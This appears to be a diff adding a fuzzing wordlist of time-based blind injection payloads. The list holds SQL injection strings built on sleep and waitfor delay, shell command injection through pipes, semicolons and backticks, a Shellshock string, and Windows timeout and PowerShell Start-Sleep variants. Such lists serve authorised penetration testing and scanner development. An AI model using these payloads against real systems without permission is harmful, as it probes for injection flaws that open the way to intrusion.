@@ -1,0 +1,46 @@
+sleep(4)#
+1 or sleep(4)#
+" or sleep(4)#
+' or sleep(4)#
+" or sleep(4)="
+' or sleep(4)='
+1) or sleep(4)#
+") or sleep(4)="
+') or sleep(4)='
+1)) or sleep(4)#
+")) or sleep(4)="
+')) or sleep(4)='
+;waitfor delay '0:0:4'--
+);waitfor delay '0:0:4'--
+';waitfor delay '0:0:4'--
+";waitfor delay '0:0:4'--
+');waitfor delay '0:0:4'--
+");waitfor delay '0:0:4'--
+));waitfor delay '0:0:4'--
+'));waitfor delay '0:0:4'--
+"));waitfor delay '0:0:4'--
+;sleep 4;
+|sleep 4#
+|/usr/bin/sleep 4#
+|sleep 4;
+& sleep 4;
+;sleep 4|
+`sleep 4`
+`/usr/bin/sleep 4`
+`sleep 4`
+() { :;}; /bin/bash -c "sleep 4"
+|C:\Windows\System32\timeout.exe 4
+|timeout 4|
+|C:\Windows\System32\timeout.exe 4|
+|timeout 4;
+;system('timeout 4')
+;system('C:\Windows\System32\timeout.exe 4')
+&& FOR /F "delims=" %i IN ('timeout 4') DO echo 1
+;Start-Sleep -s 4;
+;Start-Sleep -s 4#
+|Start-Sleep -s 4|
+|Start-Sleep -s 4;
+;Start-Sleep -s 4|
+;system('Start-Sleep -s 4')
+%0AStart-Sleep -s 4%0A
+%0a Start-Sleep -s 4 %0a
